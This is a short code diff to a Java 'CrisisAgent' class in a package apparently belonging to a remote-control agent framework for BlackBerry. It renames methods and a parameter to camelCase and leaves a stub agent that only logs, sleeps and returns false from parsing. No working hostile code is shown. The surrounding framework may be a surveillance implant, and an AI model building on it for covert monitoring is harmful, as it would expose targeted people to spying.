@@ -6,22 +6,22 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class CrisisAgent extends Agent {
     static Debug debug = new Debug("CrisisAgent", DebugLevel.VERBOSE);
 
-    public CrisisAgent(int AgentStatus) {
-        super(Agent.AGENT_CRISIS, AgentStatus, true);
+    public CrisisAgent(int agentStatus) {
+        super(Agent.AGENT_CRISIS, agentStatus, true);
     }
 
-    protected CrisisAgent(int AgentStatus, byte[] confParams) {
-        this(AgentStatus);
-        Parse(confParams);
+    protected CrisisAgent(int agentStatus, byte[] confParams) {
+        this(agentStatus);
+        parse(confParams);
     }
 
-    public void AgentRun() {
+    public void agentRun() {
         debug.trace("run");
-        this.SleepUntilStopped();
+        this.sleepUntilStopped();
 
     }
 
-    protected boolean Parse(byte[] confParameters) {
+    protected boolean parse(byte[] confParameters) {
         // TODO Auto-generated method stub
         return false;
     }
